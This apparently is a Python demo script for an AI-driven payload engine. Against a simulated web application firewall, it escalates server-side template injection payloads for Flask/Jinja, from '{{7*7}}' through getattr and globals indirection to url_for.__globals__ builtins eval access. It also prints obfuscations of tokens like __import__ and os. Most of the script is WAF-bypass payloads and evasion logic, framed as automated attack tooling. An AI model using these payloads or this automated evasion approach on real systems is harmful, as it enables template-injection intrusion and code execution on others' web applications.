#!/usr/bin/env python3
"""
Demonstration of AI payload adaptation with simulated filtering scenarios
"""
from app.core.ai_payload_engine import AIPayloadEngine, ResponseType

def simulate_waf_scenario():
    """Simulate a WAF that blocks certain tokens"""
    print("AI Payload Adaptation Simulation")
    print("="*40)
    
    ai_engine = AIPayloadEngine()
    target_url = "http://example.com"
    
    # Simulate a series of responses showing AI adaptation
    scenarios = [
        {
            'round': 1,
            'payload': '{{7*7}}',
            'response': {'status_code': 403, 'content': 'Blocked by WAF'},
            'description': 'Initial payload blocked by WAF'
        },
        {
            'round': 2,
            'payload': '{{7*7}}',  # AI will generate obfuscated version
            'response': {'status_code': 200, 'content': 'Result: 49'},
            'description': 'Obfuscated payload succeeds'
        },
        {
            'round': 3,
            'payload': '{{config}}',
            'response': {'status_code': 403, 'content': 'Blocked: config'},
            'description': 'Config access blocked'
        },
        {
            'round': 4,
            'payload': "{{getattr(globals()['__builtins__'], 'config')}}",
            'response': {'status_code': 200, 'content': '<Config DEBUG=True>'},
            'description': 'Obfuscated config access succeeds'
        }
    ]
    
    print("\nSimulated AI Adaptation Sequence:")
    print("-" * 40)
    
    for scenario in scenarios:
        print(f"\nRound {scenario['round']}: {scenario['description']}")
        print(f"Payload: {scenario['payload']}")
        
        # Process with AI engine
        result_type, next_payload = ai_engine.process_response_and_adapt(
            target_url, 
            scenario['payload'], 
            scenario['response']
        )
        
        print(f"Response: {scenario['response']['content']}")
        print(f"AI Classification: {result_type.value}")
        
        if next_payload and next_payload != scenario['payload']:
            print(f"AI Next Payload: {next_payload}")
        
        # Simulate the AI learning
        if result_type == ResponseType.FILTERED:
            print("AI Learning: Token blocked, trying obfuscation...")
        elif result_type == ResponseType.EVALUATED:
            print("AI Learning: Success! Advancing to next stage...")
    
    # Show final intelligence
    print(f"\nFinal AI Intelligence:")
    intelligence = ai_engine.get_target_intelligence(target_url)
    print(f"Blocked tokens: {intelligence['blocked_tokens']}")
    print(f"Working bypasses: {len(intelligence['working_bypasses'])}")
    print(f"Recommended approach: {intelligence['recommended_approach']}")

def demonstrate_obfuscation_techniques():
    """Show all available obfuscation techniques"""
    print("\n\nObfuscation Techniques Demo")
    print("="*30)
    
    ai_engine = AIPayloadEngine()
    dangerous_tokens = ['__class__', '__import__', 'config', 'os']
    
    for token in dangerous_tokens:
        print(f"\nObfuscating token: {token}")
        print("-" * 20)
        
        for method_name, method_func in ai_engine.strategy.obfuscation_methods.items():
            try:
                obfuscated = method_func(token)
                print(f"{method_name:15}: {token} → {obfuscated}")
            except Exception as e:
                print(f"{method_name:15}: Failed ({str(e)[:30]}...)")

def show_payload_evolution():
    """Show how payloads evolve through adaptation"""
    print("\n\nPayload Evolution Example")
    print("="*30)
    
    evolution_stages = [
        "{{7*7}}",
        "{{7*7}}",  # Same payload, different obfuscation
        "{{'7'+'*'+'7'}}",  # String concatenation
        "{{getattr(globals()['__builtins__'], 'eval')('7*7')}}",  # getattr indirection
        "{{url_for.__globals__['__builtins__']['eval']('7*7')}}"  # Flask globals access
    ]
    
    print("\nEvolution from simple to complex:")
    for i, payload in enumerate(evolution_stages, 1):
        print(f"Stage {i}: {payload}")
    
    print("\nThis demonstrates how AI adapts from:")
    print("• Simple template syntax")
    print("• String obfuscation") 
    print("• Function indirection")
    print("• Framework-specific bypasses")

if __name__ == "__main__":
    simulate_waf_scenario()
    demonstrate_obfuscation_techniques()
    show_payload_evolution()